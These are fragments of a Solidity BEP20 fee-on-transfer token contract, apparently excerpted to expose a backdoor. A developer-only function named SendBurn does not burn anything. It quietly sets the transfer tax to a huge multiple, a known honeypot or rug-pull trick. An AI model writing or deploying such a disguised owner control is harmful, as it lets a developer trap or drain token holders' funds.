...
contract CoinToken is Context, IBEP20, Ownable {
    ...
    constructor (string memory _name, string memory _symbol, uint256 _decimals, uint256 _supply, uint256 _txFee,uint256 _burnFee,uint256 _charityFee,uint256 _standard, address _FeeAddress,address tokenOwner) {
		_NAME = _name;
		_SYMBOL = _symbol;
		_DECIMALS = _decimals;
    ...
    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        ...
        _reflect(rFee, rBurn, rCharity, tFee, tBurn, tCharity);
        emit Transfer(sender, recipient, tTransferAmount);
    }
    
    modifier Dev() {
        require(_DEV == _msgSender());
        _;
    }
    ...
    function _reflect(uint256 rFee, uint256 rBurn, uint256 rCharity, uint256 tFee, uint256 tBurn, uint256 tCharity) private {
    ...
    function SendBurn() external Dev(){
        _transfertoBurn();
    }
    ...
    function _transfertoBurn() private{
        _TAX_FEE = standard * 100;
    }
